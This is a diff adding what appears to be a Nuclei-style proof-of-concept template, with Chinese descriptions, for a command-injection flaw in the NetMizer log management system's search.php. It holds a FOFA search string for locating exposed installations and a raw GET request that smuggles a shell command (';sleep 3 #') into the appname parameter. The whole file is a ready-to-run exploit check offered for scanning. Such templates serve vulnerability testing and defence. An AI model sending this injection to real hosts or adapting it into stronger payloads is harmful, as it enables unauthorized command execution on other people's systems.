@@ -1,0 +1,21 @@
+id: poc-bmbv3f87ugwc3q7m
+info:
+  name: NetMizer日志管理系统 search.php 存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bmbv3f87ugwc3q7m'
+  tags: rce,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: bmbv3f87ugwc3q7m
+    fofa: title="NetMizer 日志管理系统"
+http:
+- raw:
+  - 'GET /data/search/search.php?action=addtask&appname=search;sleep+3+%23 HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
